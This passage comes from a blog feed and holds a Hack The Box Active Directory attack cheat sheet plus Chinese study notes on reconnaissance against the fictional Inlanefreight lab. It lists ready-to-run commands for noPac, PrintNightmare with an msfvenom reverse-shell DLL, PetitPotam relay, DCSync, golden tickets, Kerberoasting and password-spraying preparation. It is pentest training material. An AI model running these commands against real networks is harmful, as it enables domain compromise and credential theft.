a target system is vulnerable to <code>noPac</code>&#x2F;<code>Sam_The_Admin</code> from a Linux-based host.</td></tr><tr><td><code>sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap</code></td><td>Used to exploit the <code>noPac</code>&#x2F;<code>Sam_The_Admin</code>  vulnerability and gain a SYSTEM shell (<code>-shell</code>). Performed from a Linux-based host.</td></tr><tr><td><code>sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator</code></td><td>Used to exploit the <code>noPac</code>&#x2F;<code>Sam_The_Admin</code>  vulnerability and perform a <code>DCSync</code> attack against the built-in Administrator account on a Domain Controller from a Linux-based host.</td></tr></tbody></table><h1 id="PrintNightmare"><a href="#PrintNightmare" class="headerlink" title="PrintNightmare"></a>PrintNightmare</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>git clone https://github.com/cube0x0/CVE-2021-1675.git</code></td><td>Used to clone a PrintNightmare exploit  using git from a Linux-based host.</td></tr><tr><td><code>pip3 uninstall impacket git clone https://github.com/cube0x0/impacket cd impacket python3 ./setup.py install</code></td><td>Used to ensure the exploit author’s (<code>cube0x0</code>) version of Impacket is installed. This also uninstalls any previous Impacket version on a Linux-based host.</td></tr><tr><td><code>rpcdump.py @172.16.5.5 | egrep &#39;MS-RPRN|MS-PAR&#39;</code></td><td>Used to check if a Windows target has <code>MS-PAR</code> &amp; <code>MSRPRN</code> exposed from a Linux-based host.</td></tr><tr><td><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.129.202.111 LPORT=8080 -f dll &gt; backupscript.dll</code></td><td>Used to generate a DLL payload to be used by the exploit to gain a shell session. Performed from a Windows-based host.</td></tr><tr><td><code>sudo smbserver.py -smb2support CompData /path/to/backupscript.dll</code></td><td>Used to create an SMB server and host a shared folder (<code>CompData</code>) at the specified location on the local linux host. This can be used to host the DLL payload that the exploit will attempt to download to the host. Performed from a Linux-based host.</td></tr><tr><td><code>sudo python3 CVE-2021-1675.py inlanefreight.local/&lt;username&gt;:&lt;password&gt;@172.16.5.5 &#39;\\10.129.202.111\CompData\backupscript.dll&#39;</code></td><td>Executes the exploit and specifies the location of the DLL payload. Performed from a Linux-based host.</td></tr></tbody></table><h1 id="PetitPotam"><a href="#PetitPotam" class="headerlink" title="PetitPotam"></a>PetitPotam</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController</code></td><td>Impacket tool used to create an <code>NTLM relay</code> by specifiying the web enrollment URL for the <code>Certificate Authority</code> host. Perfomred from a Linux-based host.</td></tr><tr><td><code>git clone https://github.com/topotam/PetitPotam.git</code></td><td>Used to clone the <code>PetitPotam</code> exploit using git. Performed from a Linux-based host.</td></tr><tr><td><code>python3 PetitPotam.py 172.16.5.225 172.16.5.5</code></td><td>Used to execute the PetitPotam exploit by  specifying the IP address of the attack host (<code>172.16.5.255</code>) and the target Domain Controller (<code>172.16.5.5</code>). Performed from a Linux-based host.</td></tr><tr><td><code>python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 &lt;base64 certificate&gt; = dc01.ccache</code></td><td>Uses <code>gettgtpkinit</code>.py to request a TGT ticket for the Domain Controller (<code>dc01.ccache</code>) from a Linux-based host.</td></tr><tr><td><code>secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass &quot;ACADEMY-EA-DC01$&quot;@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</code></td><td>Impacket tool used to perform a DCSync attack and retrieve one or all of the <code>NTLM password hashes</code> from the target Windows domain. Performed from a Linux-based host.</td></tr><tr><td><code>klist</code></td><td><code>krb5-user</code> command used to view the contents of the <code>ccache</code> file. Performed from a Linux-based host.</td></tr><tr><td><code>python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$</code></td><td>Used to submit TGS requests using <code>getnthash.py</code> from a Linux-based host.</td></tr><tr><td><code>secretsdump.py -just-dc-user INLANEFREIGHT/administrator &quot;ACADEMY-EA-DC01$&quot;@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba</code></td><td>Impacket tool used to extract hashes from <code>NTDS.dit</code> using a <code>DCSync attack</code> and a captured hash (<code>-hashes</code>). Performed from a Linux-based host.</td></tr><tr><td><code>.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /&lt;base64 certificate&gt;=/ptt</code></td><td>Uses Rubeus to request a TGT and perform a <code>pass-the-ticket attack</code> using the machine account (<code>/user:ACADEMY-EA-DC01$</code>) of a Windows target. Performed from a Windows-based host.</td></tr><tr><td><code>mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt</code></td><td>Performs a DCSync attack using <code>Mimikatz</code>. Performed from a Windows-based host.</td></tr></tbody></table><h1 id="Miscellaneous-Misconfigurations"><a href="#Miscellaneous-Misconfigurations" class="headerlink" title="Miscellaneous Misconfigurations"></a>Miscellaneous Misconfigurations</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>Import-Module .\SecurityAssessment.ps1</code></td><td>Used to import the module <code>Security Assessment.ps1</code>. Performed from a Windows-based host.</td></tr><tr><td><code>Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</code></td><td>SecurityAssessment.ps1 based tool used to enumerate a Windows target for <code>MS-PRN Printer bug</code>. Performed from a Windows-based host.</td></tr><tr><td><code>adidnsdump -u inlanefreight\\forend ldap://172.16.5.5</code></td><td>Used to resolve all records in a DNS zone over <code>LDAP</code> from a Linux-based host.</td></tr><tr><td><code>adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r</code></td><td>Used to resolve unknown records in a DNS zone by performing an <code>A query</code> (<code>-r</code>) from a Linux-based host.</td></tr><tr><td><code>Get-DomainUser * | Select-Object samaccountname,description </code></td><td>PowerView tool used to display the description field of select objects (<code>Select-Object</code>) on a target Windows domain from a Windows-based host.</td></tr><tr><td><code>Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol</code></td><td>PowerView tool used to check for the <code>PASSWD_NOTREQD</code> setting of select objects (<code>Select-Object</code>) on a target Windows domain from a Windows-based host.</td></tr><tr><td><code>ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts</code></td><td>Used to list the contents of a share hosted on a Windows target from the context of a currently logged on user. Performed from a Windows-based host.</td></tr></tbody></table><h1 id="Group-Policy-Enumeration-amp-Attacks"><a href="#Group-Policy-Enumeration-amp-Attacks" class="headerlink" title="Group Policy Enumeration &amp; Attacks"></a>Group Policy Enumeration &amp; Attacks</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE</code></td><td>Tool used to decrypt a captured <code>group policy preference password</code> from a Linux-based host.</td></tr><tr><td><code>crackmapexec smb -L | grep gpp</code></td><td>Locates and retrieves a <code>group policy preference password</code> using <code>CrackMapExec</code>, the filters the output using <code>grep</code>. Peformed from a Linux-based host.</td></tr><tr><td><code>crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin</code></td><td>Locates and retrieves any credentials stored in the <code>SYSVOL</code> share of a Windows target using <code>CrackMapExec</code> from a Linux-based host.</td></tr><tr><td><code>Get-DomainGPO | select displayname</code></td><td>PowerView tool used to enumerate GPO names in a target Windows domain from a Windows-based host.</td></tr><tr><td><code>Get-GPO -All | Select DisplayName</code></td><td>PowerShell cmd-let used to enumerate GPO names. Performed from a Windows-based host.</td></tr><tr><td><code>$sid=Convert-NameToSid &quot;Domain Users&quot; </code></td><td>Creates a variable called <code>$sid</code> that is set equal to the <code>Convert-NameToSid</code> tool and specifies the group account <code>Domain Users</code>. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainGPO | Get-ObjectAcl | ?&#123;$_.SecurityIdentifier -eq $sid</code></td><td>PowerView tool that is used to check if the <code>Domain Users</code>  (<code>eq $sid</code>) group has any rights over one or more GPOs. Performed from a Windows-based host.</td></tr><tr><td><code>Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532</code></td><td>PowerShell cmd-let used to display the name of a GPO given a <code>GUID</code>. Performed from a Windows-based host.</td></tr></tbody></table><h1 id="ASREPRoasting"><a href="#ASREPRoasting" class="headerlink" title="ASREPRoasting"></a>ASREPRoasting</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl</code></td><td>PowerView based tool used to search for the <code>DONT_REQ_PREAUTH</code> value across in user accounts in a target Windows domain. Performed from a Windows-based host.</td></tr><tr><td><code>.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat</code></td><td>Uses <code>Rubeus</code> to perform an <code>ASEP Roasting attack</code> and formats the output for <code>Hashcat</code>. Performed from a Windows-based host.</td></tr><tr><td><code>hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt </code></td><td>Uses <code>Hashcat</code> to attempt to crack the captured hash using a wordlist (<code>rockyou.txt</code>). Performed from a Linux-based host.</td></tr><tr><td><code>kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt </code></td><td>Enumerates users in a target Windows domain and automatically retrieves the <code>AS</code> for any users found that don’t require Kerberos pre-authentication. Performed from a Linux-based host.</td></tr></tbody></table><h1 id="Trust-Relationships-Child-gt-Parent-Trusts"><a href="#Trust-Relationships-Child-gt-Parent-Trusts" class="headerlink" title="Trust Relationships - Child &gt; Parent Trusts"></a>Trust Relationships - Child &gt; Parent Trusts</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>Import-Module activedirectory</code></td><td>Used to import the <code>Active Directory</code> module. Performed from a Windows-based host.</td></tr><tr><td><code>Get-ADTrust -Filter *</code></td><td>PowerShell cmd-let used to enumerate a target Windows domain’s trust relationships. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainTrust </code></td><td>PowerView tool used to enumerate a target Windows domain’s trust relationships. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainTrustMapping</code></td><td>PowerView tool used to perform a domain trust mapping from a Windows-based host.</td></tr><tr><td><code>Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName</code></td><td>PowerView tools used to enumerate users in a target child domain from a Windows-based host.</td></tr><tr><td><code>mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt</code></td><td>Uses Mimikatz to obtain the <code>KRBTGT</code> account’s <code>NT Hash</code> from a Windows-based host.</td></tr><tr><td><code>Get-DomainSID</code></td><td>PowerView tool used to get the SID for a target child domain from a Windows-based host.</td></tr><tr><td><code>Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity &quot;Enterprise Admins&quot; | select distinguishedname,objectsid</code></td><td>PowerView tool used to obtain the <code>Enterprise Admins</code> group’s SID from a Windows-based host.</td></tr><tr><td><code>ls \\academy-ea-dc01.inlanefreight.local\c$</code></td><td>Used to attempt to list the contents of the C drive on a target Domain Controller. Performed from a Windows-based host.</td></tr><tr><td><code>mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt</code></td><td>Uses <code>Mimikatz</code> to create a <code>Golden Ticket</code> from a Windows-based host .</td></tr><tr><td><code>.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt</code></td><td>Uses <code>Rubeus</code> to create a <code>Golden Ticket</code> from a Windows-based host.</td></tr><tr><td><code>mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm</code></td><td>Uses <code>Mimikatz</code> to perform a DCSync attack from a Windows-based host.</td></tr><tr><td><code>secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt</code></td><td>Impacket tool used to perform a DCSync attack from a Linux-based host.</td></tr><tr><td><code>lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 </code></td><td>Impacket tool used to perform a <code>SID Brute forcing</code> attack from a Linux-based host.</td></tr><tr><td><code>lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep &quot;Domain SID&quot;</code></td><td>Impacket tool used to retrieve the SID of a target Windows domain from a Linux-based host.</td></tr><tr><td><code>lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 &quot;Enterprise Admins&quot;</code></td><td>Impacket tool used to retrieve the <code>SID</code> of a target Windows domain and attach it to the Enterprise Admin group’s <code>RID</code> from a Linux-based host.</td></tr><tr><td><code>ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker</code></td><td>Impacket tool used to create a <code>Golden Ticket</code> from a Linux-based host.</td></tr><tr><td><code>export KRB5CCNAME=hacker.ccache</code></td><td>Used to set the <code>KRB5CCNAME Environment Variable</code> from a Linux-based host.</td></tr><tr><td><code>psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5</code></td><td>Impacket tool used to establish a shell session with a target Domain Controller from a Linux-based host.</td></tr><tr><td><code>raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm</code></td><td>Impacket tool that automatically performs an attack that escalates from child to parent domain.</td></tr></tbody></table><h1 id="Trust-Relationships-Cross-Forest"><a href="#Trust-Relationships-Cross-Forest" class="headerlink" title="Trust Relationships - Cross-Forest"></a>Trust Relationships - Cross-Forest</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName</code></td><td>PowerView tool used to enumerate accounts for associated <code>SPNs</code> from a Windows-based host.</td></tr><tr><td><code>Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select samaccountname,memberof</code></td><td>PowerView tool used to enumerate the <code>mssqlsvc</code> account from a Windows-based host.</td></tr><tr><td><code> .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap</code></td><td>Uses <code>Rubeus</code> to perform a Kerberoasting Attack against a target Windows domain (<code>/domain:FREIGHTLOGISTICS.local</code>) from a Windows-based host.</td></tr><tr><td><code>Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL</code></td><td>PowerView tool used to enumerate groups with users that do not belong to the domain from a Windows-based host.</td></tr><tr><td><code>Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator</code></td><td>PowerShell cmd-let used to remotely connect to a target Windows system from a Windows-based host.</td></tr><tr><td><code>GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley</code></td><td>Impacket tool used to request (<code>-request</code>) the TGS ticket of an account in a target Windows domain (<code>-target-domain</code>) from a Linux-based host.</td></tr><tr><td><code>bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2</code></td><td>Runs the Python implementation of <code>BloodHound</code> against a target Windows domain from a Linux-based host.</td></tr><tr><td><code>zip -r ilfreight_bh.zip *.json</code></td><td>Used to compress multiple files into 1 single <code>.zip</code> file to be uploaded into the BloodHound GUI.</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Initial-Enumeration&quot;&gt;&lt;a href=&quot;#Initial-Enumeration&quot; class=&quot;headerlink&quot; title=&quot;Initial Enumeration&quot;&gt;&lt;/a&gt;Initial Enumeration&lt;/h1&gt;&lt;tabl</summary>
      
    
    
    
    
    <category term="cheat_sheet" scheme="https://taninluv.github.io/tags/cheat-sheet/"/>
    
    <category term="AD" scheme="https://taninluv.github.io/tags/AD/"/>
    
  </entry>
  
  <entry>
    <title>AD</title>
    <link href="https://taninluv.github.io/2023/09/23/AD/"/>
    <id>https://taninluv.github.io/2023/09/23/AD/</id>
    <published>2023-09-23T03:54:00.000Z</published>
    <updated>2023-09-24T08:05:38.149Z</updated>
    
    <content type="html"><![CDATA[<ul><li>Sniffing out a Foothold</li><li>Initial Enumeration</li><li>Sniffing out a Foothold</li></ul><span id="more"></span><h3 id="External-Information-Gathering-Passive-Checks"><a href="#External-Information-Gathering-Passive-Checks" class="headerlink" title="External Information Gathering (Passive Checks)"></a>External Information Gathering (Passive Checks)</h3><p>外部信息收集被授权证明与可以从互联网上收集的有关公司的信息相关的风险。</p><h3 id="Internal-Testing"><a href="#Internal-Testing" class="headerlink" title="Internal Testing"></a>Internal Testing</h3><p>内部评估部分旨在通过尝试模拟Inlanefreight运营区域内的攻击向量来证明与内部主机和服务（特别是Active Directory）上的漏洞相关的风险。这一结果将使Inlanefright能够评估内部漏洞的风险以及成功利用漏洞的潜在影响。 </p><h3 id="Password-Testing"><a href="#Password-Testing" class="headerlink" title="Password Testing"></a>Password Testing</h3><p>从Inlanefreight设备捕获或由组织提供的密码文件可以加载到离线工作站上进行解密，并用于获得进一步的访问权限和实现评估目标。</p><h1 id="Initial-Enumeration"><a href="#Initial-Enumeration" class="headerlink" title="Initial Enumeration"></a>Initial Enumeration</h1><h2 id="What-Are-We-Looking-For"><a href="#What-Are-We-Looking-For" class="headerlink" title="What Are We Looking For?"></a>What Are We Looking For?</h2><p>在进行外部侦察时，我们应该寻找几个关键项目。这些信息可能并不总是公开的，但谨慎的做法是看看有什么。如果我们在渗透测试中陷入困境，回顾通过被动侦察可以获得的信息可以给我们前进所需的推动力，例如可以用于访问VPN或其他面向外部的服务的密码泄露数据。下表强调了我们在参与的这一阶段将寻找的“内容”。</p><table><thead><tr><th><strong>Data Point</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><code>IP Space</code></td><td>Valid ASN for our target, netblocks in use for the organization’s public-facing infrastructure, cloud presence and the hosting providers, DNS record entries, etc.</td></tr><tr><td><code>Domain Information</code></td><td>Based on IP data, DNS, and site registrations. Who administers the domain? Are there any subdomains tied to our target? Are there any publicly accessible domain services present? (Mailservers, DNS, Websites, VPN portals, etc.) Can we determine what kind of defenses are in place? (SIEM, AV, IPS&#x2F;IDS in use, etc.)</td></tr><tr><td><code>Schema Format</code></td><td>Can we discover the organization’s email accounts, AD usernames, and even password policies? Anything that will give us information we can use to build a valid username list to test external-facing services for password spraying, credential stuffing, brute forcing, etc.</td></tr><tr><td><code>Data Disclosures</code></td><td>For data disclosures we will be looking for publicly accessible files ( .pdf, .ppt, .docx, .xlsx, etc. ) for any information that helps shed light on the target. For example, any published files that contain <code>intranet</code> site listings, user metadata, shares, or other critical software or hardware in the environment (credentials pushed to a public GitHub repo, the internal AD username format in the metadata of a PDF, for example.)</td></tr><tr><td><code>Breach Data</code></td><td>Any publicly released usernames, passwords, or other critical information that can help an attacker gain a foothold.</td></tr></tbody></table><h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><p>DNS是验证我们的范围并了解客户在其范围界定文档中未披露的可访问主机的好方法。像 <a href="https://whois.domaintools.com/">domaintools</a>,和 <a href="https://viewdns.info/">viewdns.info</a>这样的网站是很好的起点。我们可以取回许多记录和其他数据，从DNS解析到DNSSEC测试，以及该网站是否可以在更受限制的国家&#x2F;地区访问。有时我们可能会发现超出范围的其他主机，但看起来很有趣。在这种情况下，我们可以将此列表带给我们的客户，看看是否确实应该将其中任何一个包含在范围内。我们可能还会发现一些有趣的子域，它们没有在范围界定文档中列出，但位于范围内的IP地址上，因此是公平的。</p><h3 id="Public-Data"><a href="#Public-Data" class="headerlink" title="Public Data"></a>Public Data</h3><p>社交媒体可能是一个有趣数据的宝库，这些数据可以为我们提供组织结构、运营何种设备、潜在的软件和安全实施、架构等方面的线索。排名第一的是与工作相关的网站，如LinkedIn、Indeed.com和Glassdoor。简单的招聘信息往往能揭示一家公司的很多情况。</p><p>现在让我们尝试另一种方法来验证结果中的两个名称服务器。</p><pre><code class="shell-session">[!bash!]$ nslookup ns1.inlanefreight.comServer:192.168.186.1Address:192.168.186.1#53Non-authoritative answer:Name:ns1.inlanefreight.comAddress: 178.128.39.165nslookup ns2.inlanefreight.comServer:192.168.86.1Address:192.168.86.1#53Non-authoritative answer:Name:ns2.inlanefreight.comAddress: 206.189.119.186 </code></pre><p><code>#53</code>是指DNS查询的默认端口</p><p>我们现在有两个新的IP地址要添加到我们的列表中进行验证和测试。在对他们采取任何进一步行动之前，请确保他们在您的测试范围内。出于我们的目的，实际的IP地址不在扫描范围内，但我们可以被动地浏览任何网站来寻找有趣的数据。目前，这就是从DNS中枚举域信息的方法。让我们来看看公开的信息。 Inlanefreight是一家虚构的公司，我们正在使用该模块，因此没有真正的社交媒体存在。然而，如果它是真实的，我们会查看LinkedIn、Twitter、Instagram和Facebook等网站，以获取有用的信息。相反，我们将继续查看inlanefreight.com网站。 我们进行的第一次检查是查找任何文档。使用filetype:pdf-inurl:inlanefreight.com作为搜索，我们正在寻找pdf。</p><h4 id="Hunting-For-Files"><a href="#Hunting-For-Files" class="headerlink" title="Hunting For Files"></a>Hunting For Files</h4><p><img src="https://academy.hackthebox.com/storage/modules/143/google-dorks.png" alt="image"></p><p>弹出了一个文档，所以我们需要确保记下该文档及其位置，并在本地下载一份副本进行挖掘。当我们遇到或生成文件时，最好保存文件、屏幕截图、扫描输出、工具输出等。这有助于我们保持尽可能全面的记录，而不会忘记我们在哪里看到的东西或丢失关键数据。接下来，让我们查找我们能找到的任何电子邮件地址。</p><h4 id="Hunting-E-mail-Addresses"><a href="#Hunting-E-mail-Addresses" class="headerlink" title="Hunting E-mail Addresses"></a>Hunting E-mail Addresses</h4><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309231609116.png" alt="image"></p><p>使用dork</p><p> intext：“@inlanefreight.com”inurl:inlanefreightcom，我们正在寻找任何与网站上电子邮件地址结尾相似的实例。一个很有希望的结果出现了一个联系人页面。当我们查看页面（如下图所示）时，我们可以看到一个庞大的员工列表和他们的联系信息。这些信息可能会有所帮助，因为我们可以确定这些人至少很可能是活跃的，并且仍在公司工作。</p><h4 id="E-mail-Dork-Results"><a href="#E-mail-Dork-Results" class="headerlink" title="E-mail Dork Results"></a>E-mail Dork Results</h4><p>浏览联系人页面 <a href="https://www.inlanefreight.com/index.php/contact/">contact page</a>，我们可以看到全球不同办公室员工的几封电子邮件。我们现在已经了解了他们的电子邮件命名约定（first.last）以及一些人在组织中的工作地点。这可能在以后的密码喷射攻击中很方便，或者如果社会工程&#x2F;网络钓鱼是我们参与范围的一部分。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309231611087.png" alt="image-20230923161131052"></p><h4 id="Username-Harvesting"><a href="#Username-Harvesting" class="headerlink" title="Username Harvesting"></a>Username Harvesting</h4><p>我们可以使用 <a href="https://github.com/initstring/linkedin2username">linkedin2username</a>等工具从公司的LinkedIn页面中抓取数据，并创建各种用户名的混搭（flast、first.last、f.last等），这些用户名可以添加到我们的潜在密码喷洒目标列表中。</p><h4 id="Credential-Hunting"><a href="#Credential-Hunting" class="headerlink" title="Credential Hunting"></a>Credential Hunting</h4><p><a href="http://dehashed.com/">Dehashed</a> </p><p>凭证搜寻 Dehashed是一个很好的工具，可以在漏洞数据中查找明文凭据和密码哈希。我们可以在网站上搜索，也可以使用通过API执行查询的脚本。通常，我们会为那些不在使用AD auth（或内部）的面向外部的门户网站上工作的用户找到许多旧密码，但我们可能会很幸运！这是另一个可用于创建外部或内部密码喷涂用户列表的工具。 注：出于我们的目的，下面的示例数据是虚构的。</p><h1 id="Initial-Enumeration-of-the-Domain"><a href="#Initial-Enumeration-of-the-Domain" class="headerlink" title="Initial Enumeration of the Domain"></a>Initial Enumeration of the Domain</h1><p>以下是我们此时应该寻找的一些关键数据点，并记在我们选择的笔记工具中，并尽可能将扫描&#x2F;工具输出保存到文件中。</p><h4 id="Key-Data-Points"><a href="#Key-Data-Points" class="headerlink" title="Key Data Points"></a>Key Data Points</h4><table><thead><tr><th><strong>Data Point</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><code>AD Users</code></td><td>We are trying to enumerate valid user accounts we can target for password spraying.</td></tr><tr><td><code>AD Joined Computers</code></td><td>Key Computers include Domain Controllers, file servers, SQL servers, web servers, Exchange mail servers, database servers, etc.</td></tr><tr><td><code>Key Services</code></td><td>Kerberos, NetBIOS, LDAP, DNS</td></tr><tr><td><code>Vulnerable Hosts and Services</code></td><td>Anything that can be a quick win. ( a.k.a an easy host to exploit and gain a foothold)</td></tr></tbody></table><h2 id="TTPs"><a href="#TTPs" class="headerlink" title="TTPs"></a>TTPs</h2><h3 id="Identifying-Hosts"><a href="#Identifying-Hosts" class="headerlink" title="Identifying Hosts"></a>Identifying Hosts</h3><p>花点时间侦听网络，看看发生了什么。我们可以使用Wireshark和TCPDump来“密切关注”网络，看看我们可以捕获哪些主机和类型的网络流量。如果评估方法是“黑匣子”，这尤其有用。我们注意到一些ARP请求和回复、MDNS和其他基本的第二层数据包（由于我们在交换网络上，我们仅限于当前的广播域），其中一些我们可以在下面看到。这是一个很好的开始，它为我们提供了一些关于客户网络设置的信息。</p><h4 id="Start-Wireshark-on-ea-attack01"><a href="#Start-Wireshark-on-ea-attack01" class="headerlink" title="Start Wireshark on ea-attack01"></a>Start Wireshark on ea-attack01</h4><pre><code class="shell-session"> $sudo -E wireshark</code></pre><p>使用<code>sudo -E</code>的主要目的是允许在切换用户的同时继续使用原始用户的环境配置。这在某些情况下非常有用，特别是当你需要使用原始用户的路径、别名、设置或其他环境变量来运行特定命令时。</p><p>如果我们在没有GUI的主机上（这是典型的），我们可以使用tcpdump、netcreds和NetMiner等来执行相同的功能。我们还可以使用tcpdump将捕获保存到.pcap文件，将其传输到另一个主机，然后在Wireshark中打开它。</p><pre><code class="shell-session">sudo tcpdump -i ens224 </code></pre><p>Responder是一种用于侦听、分析和毒害LLMNR、NBT-NS和MDNS请求和响应的工具。它有更多的功能，但目前，我们所使用的只是处于分析模式的工具。这将被动地侦听网络，而不会发送任何中毒的数据包。我们将在后面的章节中更深入地介绍这个工具。</p><h4 id="Starting-Responder"><a href="#Starting-Responder" class="headerlink" title="Starting Responder"></a>Starting Responder</h4><pre><code class="bash">sudo responder -I ens224 -A </code></pre><h4 id="FPing-Active-Checks"><a href="#FPing-Active-Checks" class="headerlink" title="FPing Active Checks"></a>FPing Active Checks</h4><p><a href="https://fping.org/">Fping</a> </p><p>在这里，我们将从几个标志开始fping：a显示活动的目标，s在扫描结束时打印统计数据，g从CIDR网络生成目标列表，q不显示每个目标的结果。</p><pre><code class="shell-session">Tanin@htb[/htb]$ fping -asgq 172.16.5.0/23172.16.5.5172.16.5.25172.16.5.50172.16.5.100172.16.5.125172.16.5.200172.16.5.225172.16.5.238172.16.5.240     510 targets       9 alive     501 unreachable       0 unknown addresses    2004 timeouts (waiting for response)    2013 ICMP Echos sent       9 ICMP Echo Replies received    2004 other ICMP received 0.029 ms (min round trip time) 0.396 ms (avg round trip time) 0.799 ms (max round trip time)       15.366 sec (elapsed real time)</code></pre><h4 id="Nmap-Scanning"><a href="#Nmap-Scanning" class="headerlink" title="Nmap Scanning"></a>Nmap Scanning</h4><p>现在我们有了网络中活动主机的列表，我们可以进一步枚举这些主机。我们希望确定每个主机正在运行的服务，确定域控制器和web服务器等关键主机，并确定以后要探测的潜在易受攻击的主机。随着我们对AD的关注，在进行了广泛的扫描后，我们最好关注通常伴随AD服务出现的标准协议，如DNS、SMB、LDAP和Kerberos等。下面是一个简单的Nmap扫描的快速示例。</p><pre><code class="bash">sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum</code></pre><ul><li><code>-v</code>: 启用详细输出，显示更多的信息。</li><li><code>-A</code>: 启用操作系统检测、版本检测、脚本扫描等一系列高级扫描技术。</li><li><code>-iL hosts.txt</code>: 从名为<code>hosts.txt</code>的文件中读取主机列表进行扫描。<code>hosts.txt</code>应该是一个包含要扫描的主机IP地址或主机名的文本文件。</li><li><code>-oN /home/htb-student/Documents/host-enum</code>: 将扫描结果以正常格式保存到<code>/home/htb-student/Documents/host-enum</code>文件中。</li></ul><h4 id="NMAP-Result-Highlights"><a href="#NMAP-Result-Highlights" class="headerlink" title="NMAP Result Highlights"></a>NMAP Result Highlights</h4><pre><code class="shell-session">Nmap scan report for inlanefreight.local (172.16.5.5)Host is up (0.069s latency).Not shown: 987 closed tcp ports (conn-refused)PORT     STATE SERVICE       VERSION53/tcp   open  domain        Simple DNS Plus88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-04-04 